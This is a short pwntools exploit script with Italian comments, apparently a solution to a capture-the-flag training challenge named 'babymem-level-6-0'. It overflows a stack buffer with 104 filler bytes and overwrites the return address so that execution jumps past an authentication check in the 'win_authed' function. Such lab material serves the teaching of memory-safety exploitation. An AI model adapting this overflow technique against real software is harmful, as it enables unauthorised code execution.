from pwn import *

elf = ELF("/challenge/babymem-level-6-0")
p = elf.process()

# Dimensione della linea
p.sendline(b"5000")

# p64 fa il packing da intero a indirizzo, little endian
payload = b"A"*(104) + p64(elf.symbols["win_authed"] + int("1c", 16))

# Mandare il payload
p.sendline(payload)

p.interactive()
